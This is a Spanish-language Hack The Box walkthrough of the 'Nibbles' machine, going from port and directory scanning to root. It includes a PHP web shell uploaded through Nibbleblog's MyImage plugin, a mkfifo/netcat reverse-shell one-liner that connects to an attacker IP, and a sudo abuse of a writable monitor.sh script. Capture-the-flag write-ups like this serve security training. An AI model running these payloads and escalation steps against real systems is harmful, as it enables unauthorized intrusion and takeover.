---
description: '✍️ Autor: Hack The Box🔍 Dificultad: Fácil  📅 Fecha de creación: 13/01/2018'
---

# Nibbles

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.129.12.162
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.12.162 
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 10.129.12.162
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web nos salga un mensaje.\
![](<../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Revisamos el código por si hay alguna información relevante.\


<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos muestra un directorio por lo que indagaremos ahí.

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://10.129.12.162/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
```

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Hay dos archivos interesantes como `admin.php` y `README`.

```bash
curl http://10.129.12.162/nibbleblog/README
```

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Hemos confirmado que la versión **4.0.3** está en uso, lo que sugiere que es probable que sea vulnerable al módulo de **Metasploit** (aunque podría tratarse de una página antigua del README). No observamos nada más relevante. Ahora, revisemos la página de inicio de sesión del portal de administración.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-07 095935.png" alt=""><figcaption></figcaption></figure>

Para usar el **exploit** mencionado, necesitaremos credenciales de administrador válidas. Probamos técnicas de omisión de autenticación y combinaciones comunes como **admin** y **admin**, sin éxito. Hay una opción para restablecer la contraseña, pero da un error de correo. Además, demasiados intentos rápidos activan un bloqueo con el mensaje **"Nibbleblog security error - Blacklist protection"**.

Volvamos a nuestros resultados de fuerza bruta en el directorio. Los códigos **200** muestran páginas accesibles, los **403** indican acceso prohibido y el **301** es una redirección permanente. Navegamos a **nibbleblog/themes/** y vemos que el listado de directorios está habilitado.

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al navegar a **nibbleblog/content**, encontramos subdirectorios interesantes: public, private y tmp. Explorando un poco, encontramos un archivo **users.xml** que confirma que el nombre de usuario es **admin**. También muestra direcciones IP en la lista negra. Podemos solicitar este archivo con **cURL** y formatear la salida **XML** usando **xmllint**.

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Confirmamos que **admin** es el usuario.

No hay otros puertos abiertos y no encontramos más directorios. Podemos confirmarlo realizando fuerza bruta adicional en directorios contra la raíz de la aplicación web.

```bash
gobuster dir -u http://10.129.12.162/ --wordlist /usr/share/dirb/wordlists/common.txt
```

<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al revisar nuevamente todos los directorios expuestos, encontramos un archivo **config.xml**.

```bash
curl -s http://10.129.12.162/nibbleblog/content/private/config.xml | xmllint --format -
```

<figure><img src="../../.gitbook/assets/image (19) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al revisar el archivo, esperamos encontrar contraseñas, pero no obtenemos resultados. Sin embargo, vemos dos menciones de "**nibbles**" en el título del sitio y en la dirección de correo de notificación. Este también es el nombre de la máquina.&#x20;

Al realizar cracking de contraseñas offline con una herramienta como **Hashcat** o al intentar adivinar una contraseña, es importante considerar toda la información disponible. No es raro descifrar una contraseña (como la de la red inalámbrica de una empresa) usando una lista de palabras generada al rastrear su sitio web con una herramienta como **CeWL**.

```bash
cewl http://10.129.12.162/nibbleblog -w wordlist.txt
```

<figure><img src="../../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Intentemos usar el plugin **MyImage** para cargar un fragmento de código **PHP** en lugar de una imagen. El siguiente fragmento se puede usar para probar la ejecución de código.

```bash
<?php system('id'); ?>
```

Ahora tenemos que averiguar dónde se subió el archivo si la carga fue exitosa. Volviendo a los resultados de fuerza bruta en los directorios, recordamos el directorio `/content`. Dentro de este, hay un directorio `plugins` y otro subdirectorio llamado `my_image`. La ruta completa es `http://<host>/nibbleblog/content/private/plugins/my_image/`. En este directorio, vemos dos archivos, `db.xml` e `image.php`, con una fecha de última modificación reciente, ¡lo que significa que nuestra carga fue exitosa! Ahora vamos a verificar si tenemos ejecución de comandos.

```bash
curl http://10.129.12.162/nibbleblog/content/private/plugins/my_image/image.php
```

<figure><img src="../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

Parece que hemos obtenido ejecución remota de código en el servidor web, y el servidor Apache se está ejecutando en el contexto del usuario `nibbler`. Vamos a modificar nuestro archivo PHP para obtener una shell inversa y comenzar a explorar el servidor.

Vamos a editar nuestro archivo PHP local y subirlo nuevamente. Este comando debería proporcionarnos una shell inversa. Como se mencionó anteriormente en el Módulo, existen muchas hojas de trucos para shells inversas. Algunas muy buenas son [PayloadAllTheThings ](https://github.com/swisskyrepo/PayloadsAllTheThings)entre otras.

Utilicemos el siguiente one-liner de Bash para la shell inversa y añádelo a nuestro script PHP.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```

```bash
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.47 443 >/tmp/f"); ?>
```

```bash
nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

Pinchamos en el fichero image.php.

<figure><img src="../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

Tenemos Python3, lo cual nos permite obtener una shell más amigable escribiendo `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Al navegar a `/home/nibbler`, encontramos la bandera `user.txt` así como un archivo zip llamado `personal.zip`.

<figure><img src="../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Si accedemos a esa ruta, veremos que no existe. Por lo tanto, necesitaremos crear el directorio y el archivo:

```bash
cd /home/nibbler
mkdir -p personal/stuff
cd personal/stuff
echo "/bin/bash" > monitor.sh
chmod +x monitor.sh
sudo ./monitor.sh
```

Con estos pasos, obtendremos acceso root. Luego, al ir a `/root/root.txt`, podremos ver la bandera ROOT.

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
